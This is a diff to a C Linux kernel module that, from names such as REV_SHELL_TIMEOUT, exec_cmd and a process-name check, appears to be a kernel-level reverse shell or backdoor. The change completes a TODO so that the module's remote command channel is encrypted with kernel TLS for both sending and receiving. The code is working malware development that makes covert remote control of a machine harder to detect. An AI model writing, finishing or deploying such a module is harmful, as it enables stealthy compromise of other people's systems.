@@ -18,8 +18,9 @@
 #include <linux/socket.h>
 #include <linux/string.h>
 #include <linux/tcp.h>
-#include <linux/tls.h>
 #include <linux/xarray.h>
+#include <net/sock.h>
+#include <net/tls.h>
 
 // #include <string.h>
 
@@ -40,16 +41,6 @@
 #define MAX_RETRIES 3
 #define RETRY_DELAY_MS 5000
 
-struct proc_check_info {
-  const char *expected_comm;
-  unsigned int comm_len;
-} __attribute__((packed, aligned(8)));
-
-static struct proc_check_info mon_info = {.expected_comm = "noprocname",
-                                          .comm_len = 10};
-
-static unsigned int mon_sleep = REV_SHELL_TIMEOUT;
-
 int tcp_send(struct socket *sock, const char *buf, size_t len);
 int tcp_recv(struct socket *sock, char *buf, size_t max_size);
 int socket_init(struct socket **sock, struct task_struct **thread);
@@ -57,22 +48,50 @@ int exec_cmd(void);
 
 static int tls_setup_socket(struct socket *sock, const unsigned char *key,
                             const unsigned char *iv, const unsigned char *salt,
-                            const unsigned char *rec_seq) {
+                            const unsigned char *tx_seq,
+                            const unsigned char *rx_seq) {
   struct tls12_crypto_info_aes_gcm_128 crypto_info = {0};
+  int ret;
 
-  if (!sock || !key || !iv || !salt || !rec_seq)
+  if (!sock || !key || !iv || !salt || !tx_seq || !rx_seq)
     return -EINVAL;
 
-  crypto_info.info.version = TLS_1_2_VERSION;
-  crypto_info.info.cipher_type = TLS_CIPHER_AES_CCM_128;
+  ret = sock->ops->setsockopt(sock, SOL_TCP, TCP_ULP, KERNEL_SOCKPTR("tls"),
+                              strlen("tls"));
+  if (ret < 0) {
+    pr_err("ktls: failed to attach TCP ULP: %d\n", ret);
+    return ret;
+  }
 
+  memset(&crypto_info, 0, sizeof(crypto_info));
+  crypto_info.info.version = TLS_1_2_VERSION;
+  crypto_info.info.cipher_type = TLS_CIPHER_AES_GCM_128;
   memcpy(crypto_info.key, key, TLS_KEY_SIZE);
   memcpy(crypto_info.iv, iv, TLS_IV_SIZE);
   memcpy(crypto_info.salt, salt, TLS_SALT_SIZE);
-  memcpy(crypto_info.rec_seq, rec_seq, TLS_SEQ_SIZE);
+  memcpy(crypto_info.rec_seq, tx_seq, TLS_SEQ_SIZE);
 
-  // todo
-  //
+  ret = sock->ops->setsockopt(
+      sock, SOL_TLS, TLS_TX, KERNEL_SOCKPTR(&crypto_info), sizeof(crypto_info));
+  if (ret < 0) {
+    pr_err("ktls: setsockopt SOL_TLS failed %d\n", ret);
+    return ret;
+  }
+
+  memset(&crypto_info, 0, sizeof(crypto_info));
+  crypto_info.info.version = TLS_1_2_VERSION;
+  crypto_info.info.cipher_type = TLS_CIPHER_AES_GCM_128;
+  memcpy(crypto_info.key, key, TLS_KEY_SIZE);
+  memcpy(crypto_info.iv, iv, TLS_IV_SIZE);
+  memcpy(crypto_info.salt, salt, TLS_SALT_SIZE);
+  memcpy(crypto_info.rec_seq, rx_seq, TLS_SEQ_SIZE);
+
+  ret = sock->ops->setsockopt(
+      sock, SOL_TLS, TLS_RX, KERNEL_SOCKPTR(&crypto_info), sizeof(crypto_info));
+  if (ret) {
+    pr_err("ktls: failed to set RX ctx: %d\n", ret);
+    return ret;
+  }
   //
   return 0;
 }
